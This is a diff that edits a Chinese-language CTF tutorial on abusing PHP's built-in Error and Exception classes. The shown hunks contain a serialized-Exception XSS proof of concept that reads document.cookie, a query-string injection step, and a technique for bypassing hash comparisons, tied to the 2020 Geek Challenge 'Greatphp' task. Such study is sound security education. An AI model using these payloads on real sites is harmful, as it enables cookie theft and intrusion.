@@ -51,7 +51,7 @@ echo $c;
 
 造成了xss攻击。
 
-## **Exception类**
+## Exception类**
 
 **利用条件**
 
@@ -86,15 +86,16 @@ echo unserialize($a);
 
 ```php
 <?php
-$poc=new        Exception("<script>alert(document.cookie)</script>");
+$poc=new Exception("<script>alert(document.cookie)</script>");
 Echo urlencode(serialize($poc));?>
 //反弹cookie
 ```
 
 将得到的结果传入
 
+```bash
 /?yds_is_so_beautiful=$POC
-
+```
 ## 利用Error/Exception 内置类绕过哈希比较
 
 测试代码
@@ -116,7 +117,7 @@ echo "\r\n\r\n";
 echo $b;
 ```
 
-输出
+输出:
 
 ```HTTP
 Error: payload in D:\phpstudy_pro\WWW\test.php:2
@@ -128,11 +129,12 @@ Stack trace:
 #0 {main}
 ```
 
-$$a 和$$b 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。
+`$a` 和`$b` 这两个错误对象本身是不同的，但是 __toString 方法返回的结果是相同的。
 
-可以利用这个方法果然哈希比较。
+可以利用这个方法绕过哈希比较。
 
-**[2020 极客大挑战]Greatphp** 考点：php内置绕过哈希比较、php取反绕过
+[2020 极客大挑战]Greatphp
+考点：php内置绕过哈希比较、php取反绕过
 
 ```Bash
 <?php
